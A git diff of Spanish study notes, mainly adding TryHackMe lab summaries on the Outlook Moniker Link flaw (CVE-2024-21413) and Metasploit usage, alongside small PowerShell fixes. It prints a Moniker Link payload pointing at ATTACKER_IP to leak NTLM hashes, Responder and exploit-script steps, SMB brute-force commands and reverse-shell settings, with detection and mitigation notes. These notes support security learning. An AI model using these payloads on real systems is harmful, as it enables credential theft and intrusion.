@@ -281,7 +281,7 @@
   Select-String -Path C:\Logs\*.log -Pattern "error","fail"
 
   # Buscar de forma recursiva en un directorio
-  Select-String -Path C:\Logs\* -Pattern "timeout" -Recurse
+  Get-ChildItem -Path C:\Logs -File -Recurse | Select-String -Pattern "timeout"
 
   # Mostrar solo la línea coincidente
   Get-Content C:\Logs\app.log | Select-String "warning"
@@ -374,7 +374,7 @@
   Get-Service -Name "wuauserv"
 
   # Mostrar nombre, estado y tipo de inicio
-  Get-Service | Select-Object Name, Status,
+  Get-Service | Select-Object Name, Status, StartType
   ```
 
 - `Get-NetTCPConnection` — muestra las conexiones TCP activas en el sistema.
@@ -687,5 +687,228 @@ hashcat --show hashes.txt            # mostrar crackeados
 cut -d: -f2 cracked.txt              # extraer solo passwords
 hashid <hash>                        # identificar modo sugerido
 ```
+
+---
+
+# Moniker Link (CVE-2024-21413)
+
+Room de TryHackMe sobre una vulnerabilidad de Microsoft Outlook (RCE + fuga de credenciales).
+
+## Introducción
+- **Qué es:** vulnerabilidad de Outlook que permite ejecución remota de código (RCE) y filtración de credenciales. Anunciada por Microsoft el 13/02/2024, descubierta por Haifei Li (Check Point Research).
+- **Cómo funciona:** evade los mecanismos de seguridad de Outlook al manejar un tipo de hipervínculo llamado **Moniker Link**.
+- **Ataque:** el atacante manda un correo con un Moniker Link malicioso. Al hacer clic, Outlook envía al atacante las credenciales **NTLM** del usuario.
+- **Puntaje:** CVSS **9.8**, severidad **Critical**, complejidad de ataque baja.
+- **Versiones afectadas:**
+  - Microsoft Office LTSC 2021: desde 19.0.0
+  - Microsoft 365 Apps for Enterprise: desde 16.0.1
+  - Microsoft Office 2019: desde 16.0.1
+  - Microsoft Office 2016: desde 16.0.0 hasta antes de 16.0.5435.1001
+
+## Cómo funciona la vulnerabilidad
+- Outlook renderiza correos como HTML y procesa enlaces HTTP/HTTPS, pero también abre URLs que apuntan a aplicaciones (**Moniker Links**).
+- **Protected View (Vista protegida):** abre los correos con adjuntos/enlaces en modo solo lectura y bloquea macros; muestra una advertencia al disparar apps externas.
+- Con el Moniker Link `file://` se le pide a Outlook acceder a un archivo en un recurso de red por **SMB** (autentica con credenciales locales). La Vista protegida normalmente **bloquea** esto.
+- **El bypass:** agregar el carácter especial `!` más texto al final del enlace evade la Vista protegida:
+  ```html
+  <a href="file://ATTACKER_IP/test!exploit">Click me</a>
+  ```
+- El recurso compartido **no necesita existir**: el intento de autenticación se hace igual y se envía el hash **netNTLMv2** de la víctima al atacante.
+- El RCE es posible porque los Moniker Links usan **COM** (Component Object Model) en Windows (fuera del alcance de la room; sin PoC público de RCE).
+
+## Explotación (práctica)
+1. **Listener SMB** en el AttackBox con Responder (interfaz `ens5`):
+   ```bash
+   responder -I ens5
+   ```
+2. Abrir **Outlook** en la máquina vulnerable y cerrar los dos popups de inicio de sesión / clave de producto. El buzón de la víctima ya viene configurado.
+3. En el AttackBox, crear `exploit.py` (`nano exploit.py`) con el PoC de CMNatic. El script:
+   - Toma email atacante y víctima, y una contraseña (acá `attacker@monikerlink.thm` → `attacker`).
+   - Incluye el `html_content` con el Moniker Link como hipervínculo HTML.
+   - Envía el correo al servidor SMTP (puerto 25).
+4. Ajustar antes de correr:
+   - Moniker Link (línea 12) → IP del AttackBox.
+   - Placeholder `MAILSERVER` (línea 31) → `MACHINE_IP`.
+5. Ejecutar y usar la contraseña `attacker`:
+   ```bash
+   python3 exploit.py
+   ```
+   Imprime "Email delivered" si salió bien.
+6. En la máquina vulnerable, abrir el correo y hacer clic en "Click me".
+7. En la terminal de Responder aparece el hash **netNTLMv2** de la víctima.
+
+## Detección
+- **YARA:** regla de Florian Roth (`EXPL_CVE_2024_21413_Microsoft_Outlook_RCE_Feb24`) que detecta correos con el elemento `file:\\` del Moniker Link. Busca cabeceras (`Subject:`, `Received:`) + una regex de rutas `file://` con extensión y el carácter `!`; condición: archivo < 1000 KB.
+- **Wireshark:** la petición SMB de la víctima al atacante se ve en la captura, con el hash netNTLMv2 (truncado).
+
+## Mitigación
+- **Parche:** Microsoft lo corrigió en el "Patch Tuesday" de febrero de 2024. Actualizar Office vía Windows Update o el Microsoft Update Catalog (buscar el KB según el build de Office).
+- **Buenas prácticas para usuarios:**
+  - No hacer clic en enlaces aleatorios (sobre todo de correos no solicitados).
+  - Previsualizar los enlaces antes de hacer clic.
+  - Reenviar los correos sospechosos al área de ciberseguridad.
+- **Limitaciones:** como la vulnerabilidad evade la Vista protegida, no se puede reconfigurar Outlook para prevenirla. Bloquear SMB por completo puede ser contraproducente (es necesario para acceder a recursos de red), aunque según la organización se podría bloquear a nivel de firewall.
+
+---
+
+# Metasploit: Introducción
+
+Room de TryHackMe sobre el framework de explotación más usado.
+
+## Introducción
+- Metasploit soporta todas las fases de un pentest: desde recolección de información hasta post-explotación.
+- **Dos versiones principales:**
+  - **Metasploit Pro:** versión comercial, con GUI, que facilita automatización y gestión de tareas.
+  - **Metasploit Framework:** versión open-source de línea de comandos. Es la que usa esta room (viene en el AttackBox y en la mayoría de distros de pentesting).
+- Sirve para recolección de info, escaneo, explotación, desarrollo de exploits y post-explotación. También para investigación de vulnerabilidades.
+- **Componentes principales:**
+  - **msfconsole:** la interfaz de línea de comandos principal.
+  - **Modules (módulos):** exploits, scanners, payloads, etc.
+  - **Tools:** herramientas independientes como `msfvenom`, `pattern_create` y `pattern_offset`. En esta room se cubre `msfvenom`; los otros dos son para desarrollo de exploits (fuera del alcance).
+
+## Módulos
+- Se arranca la consola con `msfconsole`. Los **módulos** son componentes que hacen una tarea específica (explotar, escanear, fuerza bruta, etc.).
+- **Conceptos clave:**
+  - **Exploit:** código que aprovecha una vulnerabilidad del objetivo.
+  - **Vulnerabilidad:** fallo de diseño, código o lógica en el objetivo.
+  - **Payload:** código que corre en el objetivo para lograr el objetivo del atacante (shell, leer datos, etc.).
+- **Categorías de módulos:**
+  - **Auxiliary:** soporte (scanners, crawlers, fuzzers).
+  - **Encoders:** codifican exploit/payload para evadir antivirus de firmas (éxito limitado).
+  - **Evasion:** intentan directamente evadir el antivirus.
+  - **Exploits:** organizados por sistema objetivo.
+  - **NOPs:** "No Operation" (`0x90` en x86), relleno para tamaños de payload consistentes.
+  - **Payloads:** código que corre en el objetivo. Subtipos:
+    - **Adapters:** envuelven singles para convertirlos a otro formato (ej. comando PowerShell).
+    - **Singles:** autocontenidos, no descargan nada extra.
+    - **Stagers:** establecen el canal entre Metasploit y el objetivo (suben un stager pequeño que descarga el resto).
+    - **Stages:** lo que descarga el stager; permite payloads más grandes.
+  - **Post:** módulos de post-explotación.
+- **Single vs staged por el nombre:**
+  - `generic/shell_reverse_tcp` → **single/inline** (`_` entre `shell` y `reverse`).
+  - `windows/x64/shell/reverse_tcp` → **staged** (`/` entre `shell` y `reverse`).
+- En el AttackBox los módulos están en `/opt/metasploit-framework/embedded/framework/modules`.
+
+## msfconsole (comandos principales)
+- Se lanza con `msfconsole`; el prompt pasa a `msf6`. Funciona como shell de Linux (`ls`, `ping`, `clear`), pero **no** soporta redirección de salida (`help > help.txt` falla).
+- **Comandos útiles:**
+  - `help` / `help <comando>` — ayuda general o de un comando.
+  - `history` — comandos escritos antes.
+  - **Tab** — autocompleta comandos y módulos.
+- **Manejo por contexto:** al cambiar de módulo se pierden los parámetros seteados (salvo variables globales con `-g`).
+  - `use <módulo>` o `use <número>` — entra al contexto de un módulo. Los comandos de Linux siguen funcionando (no "entrás" a una carpeta).
+  - `show options` — parámetros del módulo (ej. exploit pide `RHOSTS`/`RPORT`; módulo post pide `SESSION`).
+  - `show <tipo>` — lista módulos (`show payloads` dentro de un exploit lista los compatibles).
+  - `back` — sale del contexto.
+  - `info` / `info <ruta>` — info detallada (autor, fuentes, descripción).
+- **`search`:** busca por CVE, nombre o sistema.
+  - Columna **"rank"** = fiabilidad del exploit (uno de rank bajo puede andar; uno excelente puede fallar o tirar el objetivo).
+  - Filtros: `search type:auxiliary telnet`, `search cve:2009 type:exploit`, `platform`.
+- **EternalBlue (MS17-010):** exploit de SMBv1 atribuido a la NSA, filtrado por Shadow Brokers (abr 2017) y usado en WannaCry (may 2017).
+
+## Parámetros y ejecución de módulos
+- Setear parámetros: `set PARAMETER VALUE`. Usar siempre `show options` para ver los requeridos.
+- **Los 5 prompts:**
+  - `root@...:~#` — sistema normal (sin comandos de Metasploit).
+  - `msf6 >` — msfconsole, sin contexto.
+  - `msf6 exploit(...) >` — contexto de un módulo.
+  - `meterpreter >` — agente Meterpreter cargado en el objetivo.
+  - `C:\Windows\system32>` — shell directa en el objetivo.
+- Ojo con los valores por defecto (ej. `RPORT 80` cuando el objetivo usa 8080).
+- **Parámetros comunes:**
+  - `RHOSTS` — IP(s) del objetivo (IP, rango, CIDR o `file:/ruta/targets.txt`).
+  - `RPORT` — puerto del objetivo.
+  - `PAYLOAD` — payload a usar.
+  - `LHOST` — IP de la máquina atacante.
+  - `LPORT` — puerto local para la reverse shell.
+  - `SESSION` — ID de conexión (para módulos post).
+- **Limpiar:** `unset PARAMETER` (uno), `unset all` (todos).
+- **Globales:** `setg PARAMETER VALUE` (persiste entre módulos), `unsetg PARAMETER` (limpia).
+- **Ejecutar:**
+  - `exploit` — lanza el módulo. `run` es alias (mejor para no-exploits).
+  - `exploit -z` — ejecuta y manda la sesión al background al abrirse.
+  - `check` — verifica si el objetivo es vulnerable sin explotarlo (si el módulo lo soporta).
+- **Sesiones** (canal con el objetivo al explotar con éxito):
+  - `background` o `CTRL+Z` — manda la sesión al background.
+  - `sessions` — lista sesiones activas.
+  - `sessions -i <id>` — interactúa con una sesión.
+
+---
+
+# Metasploit: Exploitation
+
+Room de TryHackMe sobre escaneo, base de datos, msfvenom y explotación con Metasploit.
+
+## Introducción
+- Temas de la room:
+  - Escanear objetivos con Metasploit.
+  - Usar la función de base de datos.
+  - Hacer vulnerability scanning con Metasploit.
+  - Explotar servicios vulnerables.
+  - Usar `msfvenom` para crear payloads y obtener una sesión Meterpreter.
+- **Wordlist del AttackBox** (para fuerza bruta): `/usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt`.
+- Se arranca con `msfconsole`.
+
+## Scanning
+- **Port scanning:** `search portscan` lista los módulos (`portscan/tcp`, `/syn`, `/ack`, `/xmas`).
+  - Opciones: `CONCURRENCY`, `PORTS`, `RHOSTS`, `THREADS` (más threads = más rápido).
+  - Ojo: `PORTS 1-1000` **no** equivale a Nmap (Nmap = los 1000 más usados; Metasploit = del 1 al 10000).
+  - No es lo más rápido para escanear; para velocidad, Nmap.
+- **Nmap desde msfconsole:** `nmap -sS <IP>` directo en el prompt.
+- **UDP:** `scanner/discovery/udp_sweep` identifica rápido servicios UDP (DNS, NetBIOS).
+- **SMB:** módulos auxiliary útiles → `smb_version`, `smb_enumshares`.
+- **NetBIOS:** el nombre del objetivo da pistas de su rol (ej. `CORP-DC`). Puede haber shares sin password o con passwords débiles.
+- **Fuerza bruta SMB** (ej. password de un usuario):
+  ```
+  use auxiliary/scanner/smb/smb_login
+  set RHOSTS <IP>
+  set SMBUser <usuario>
+  set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt
+  run
+  ```
+  La password válida aparece con `[+]`.
+
+## Base de datos de Metasploit
+- Sirve para gestionar engagements con varios objetivos (guarda hosts, servicios, resultados). En el AttackBox ya viene lista; en Kali hay que inicializarla.
+- **Inicializar (solo Kali / instalación propia):**
+  - `systemctl start postgresql` (en Docker: `service postgresql start`).
+  - `sudo -u postgres msfdb init` (como root falla: "run msfdb as a non-root user").
+  - Rehacer: `sudo -u postgres msfdb delete` y volver a init.
+  - Verificar en msfconsole: `db_status` → "Connected to msf".
+- **Workspaces** (aíslan proyectos):
+  - `workspace` — lista (activo con `*`).
+  - `workspace -a <nombre>` / `-d <nombre>` — crear / borrar.
+  - `workspace <nombre>` — cambiar.
+- **Comandos de DB:**
+  - `db_nmap <opciones> <IP>` — corre nmap y guarda resultados (ej. `db_nmap -sV -p- <IP>`).
+  - `hosts` / `services` — lista hosts / servicios guardados.
+  - `hosts -R` — carga los hosts guardados en `RHOSTS` (usa todos si hay varios).
+  - `services -S <texto>` — busca servicios en la DB (ej. `services -S netbios`).
+  - `db_import` / `db_export`, `vulns`, `loot`, `notes`.
+- **Flujo típico:** `db_nmap` (descubrir) → módulo de escaneo (vulns/puertos) → `hosts -R` (setear RHOSTS).
+- **Low-hanging fruits:** HTTP (SQLi/RCE), FTP (login anónimo), SMB (MS17-010), SSH (credenciales débiles), RDP (BlueKeep / credenciales débiles).
+
+## Vulnerability scanning
+- Metasploit ayuda a encontrar **low-hanging fruit**: vulns fáciles de identificar/explotar para ganar un pie inicial (a veces root/admin).
+- Depende mucho de escanear y hacer **fingerprint** del objetivo: cuanto mejor identificás servicios, más opciones te da Metasploit.
+- **Flujo:** identificás un servicio (ej. VNC) → `search` lista módulos (payloads, post y scanners). Los scanners sirven ya en esta etapa aunque todavía no tengas un exploit.
+  - `use auxiliary/scanner/vnc/` + Tab → lista scanners (`vnc_login`, `vnc_none_auth`, `ard_root_pw`).
+  - `vnc_login` busca credenciales VNC por fuerza bruta.
+- `info <módulo>` — uso, propósito, autor y opciones de cualquier módulo.
+
+## Exploitation
+- Flujo: `search` (encontrar exploit) → `info` (entenderlo) → `exploit`/`run` (lanzarlo). El éxito depende de conocer bien los servicios del target.
+- **Payloads:**
+  - La mayoría de exploits trae un payload por defecto.
+  - `show payloads` — lista los compatibles.
+  - `set payload <nº o nombre>` — lo elige.
+  - Elegir uno que funcione puede ser prueba y error (firewall, AV, escritura de archivos, intérprete inexistente en el target).
+  - Algunos payloads abren parámetros nuevos (`show options`). Un reverse pide al menos `LHOST` (+ `LPORT`, default 4444).
+- **Sesiones** (shell/Meterpreter al explotar):
+  - `CTRL+Z` manda al background, `CTRL+C` aborta.
+  - `sessions` / `sessions -l` — lista.
+  - `sessions -i <id>` — interactúa.
+  - `sessions -h` — ayuda (`-K` mata todas, `-k <id>` una, `-u <id>` upgradea shell → Meterpreter, `-C` corre comando Meterpreter).
+- **Ojo:** arrancar una Lab Machine nueva termina la anterior → **IP de target cambia**, hay que re-escanear (`db_nmap -sV <IP>`).
 
 
